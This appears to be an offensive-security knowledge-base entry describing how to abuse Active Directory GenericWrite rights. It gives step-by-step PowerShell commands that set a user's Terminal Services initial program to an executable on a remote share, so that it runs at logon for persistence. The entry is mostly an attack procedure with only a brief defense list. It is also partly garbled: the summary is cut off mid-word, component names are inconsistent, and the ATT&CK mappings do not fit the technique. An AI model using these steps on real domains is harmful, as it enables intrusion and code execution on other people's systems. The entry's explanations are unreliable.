---
id: 9ff0dba8-15a6-442a-8ac3-0e26ced2053b
name: Abusing Active Directory ACLs/ACEs - GenericWrite and Remote Connection Manager
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:06.796678+00:00'
updated_at: '2023-04-10T20:26:00.120400+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]'
- '[[Modify Registry|T1112 - Modify Registry]]'
sub_techniques:
- '[[Bypass User Account Control|T1548.002 - Bypass User Account Control]]'
tags:
- '[[Abusing Active Directory ACLs/ACEs]]'
- '[[Active Directory Attacks]]'
- '[[GenericWrite]]'
- '[[GenericWrite and Remote Connection Manager]]'
commands:
- '[[Retrieve User Object]]'
- '[[Save Changes]]'
- '[[Set Terminal Services Initial Program]]'
- '[[Set Terminal Services Work Directory]]'
---

# Abusing Active Directory ACLs/ACEs - GenericWrite and Remote Connection Manager

## Summary

Abusing Active Directory ACLs/ACEs - GenericWrite and Remote Connection Manager is a technique used by attackers to gain persistence in a compromised network. This technique involves modifying the permissions of an Active Directory object to grant the attacker the GenericWrite permission. This perm

## Description

# Description

Abusing Active Directory ACLs/ACEs - GenericWrite and Remote Connection Manager is a technique used by attackers to gain persistence in a compromised network. This technique involves modifying the permissions of an Active Directory object to grant the attacker the GenericWrite permission. This permission allows the attacker to modify the object's attributes, including the security descriptor, which can be used to grant the attacker additional permissions. Remote Connection Manager (RCM) is a component of Remote Desktop Services (RDS) that allows users to connect to remote desktops. Attackers can abuse RCM to establish a remote connection to a compromised system and maintain persistence in the network.

This technique can be used to achieve multiple objectives, including gaining access to sensitive data, stealing credentials, and moving laterally within the network. Attackers can use this technique to establish a foothold in the network and maintain persistence even after the initial compromise has been detected and remediated.

From a business perspective, this technique can be devastating as it can lead to data theft, financial loss, and reputational damage.

## Requirements

1. Access to the Active Directory object that will be modified

1. Access to Remote Connection Manager (RCM)

## Defense

1. Limit the permissions of Active Directory objects to prevent unauthorized modifications

1. Monitor Active Directory for changes to security descriptors

1. Restrict access to Remote Connection Manager (RCM) to authorized users only

## Objectives

1. Establish persistence in the compromised network

1. Gain access to sensitive data

1. Steal credentials

1. Move laterally within the network

# Instructions

1. To configure Remote Control Manager (RCM) for Remote Desktop Services (RDS), perform the following steps:
1. Open PowerShell as an administrator.
2. Copy and paste the provided code into the PowerShell window.
3. Replace the values for "\\1.2.3.4\share\file.exe" and "C:\" with the appropriate values for your environment.
4. Run the script.

**Code**: [[$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=]]

> This command configures the Remote Control Manager (RCM) for Remote Desktop Services (RDS). The RCM allows an administrator to remotely control a user's session on a terminal server. The provided PowerShell code creates a UserObject and sets the TerminalServicesInitialProgram and TerminalServicesWorkDirectory properties to the specified values. This will cause the specified program to launch when a user logs in to the terminal server and sets the working directory for the program. The SetInfo() method is then called to save the changes to the UserObject. Note that the RCM is only active on Terminal Servers/Remote Desktop Session Hosts and has been disabled on recent versions of Windows (>2016), which requires a registry change to re-enable.

**Command** ([[Retrieve User Object]]):

```bash
$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
```

**Command** ([[Set Terminal Services Initial Program]]):

```bash
$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
```

**Command** ([[Set Terminal Services Work Directory]]):

```bash
$UserObject.TerminalServicesWorkDirectory = "C:\"
```

**Command** ([[Save Changes]]):

```bash
$UserObject.SetInfo()
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]
- [[Modify Registry|T1112 - Modify Registry]]

### Sub-Techniques

- [[Bypass User Account Control|T1548.002 - Bypass User Account Control]]

## Commands Used

- [[Retrieve User Object]]
- [[Save Changes]]
- [[Set Terminal Services Initial Program]]
- [[Set Terminal Services Work Directory]]

## Tags

- [[Abusing Active Directory ACLs/ACEs]]
- [[Active Directory Attacks]]
- [[GenericWrite]]
- [[GenericWrite and Remote Connection Manager]]
